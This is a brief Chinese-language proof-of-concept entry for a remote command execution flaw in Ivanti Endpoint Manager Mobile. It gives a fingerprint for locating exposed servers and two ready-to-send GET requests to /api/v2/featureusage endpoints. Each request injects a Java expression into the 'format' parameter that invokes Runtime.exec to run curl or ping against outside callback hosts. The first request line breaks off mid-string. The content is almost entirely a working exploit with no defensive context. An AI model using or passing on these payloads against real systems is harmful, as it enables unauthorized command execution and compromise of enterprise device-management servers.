# IvantiEndpointManagerMobile存在远程命令执行漏洞

IvantiEndpointManagerMobile ｜ 命令执行 ｜ —
- **指纹**：`icon_hash="362091310"`
- **请求**：`GET /api/v2/featureusage?adminDeviceSpaceId=131&format=%24%7b''.getClass().forName('java.lang.Runtime').getMethod('getRuntime').invoke(''.getClass().forName('java.lang.Runtime')).exec('curl%20test2.lp`

**Payload**
```
Poc2：
GET /api/v2/featureusage_history?adminDeviceSpaceId=131&format=%24%7b''.getClass().forName('java.lang.Runtime').getMethod('getRuntime').invoke(''.getClass().forName('java.lang.Runtime')).exec('ping%20111.sc3l59.dnslog.cn')%7d HTTP/1.1
Host:
```
- **响应特征**：200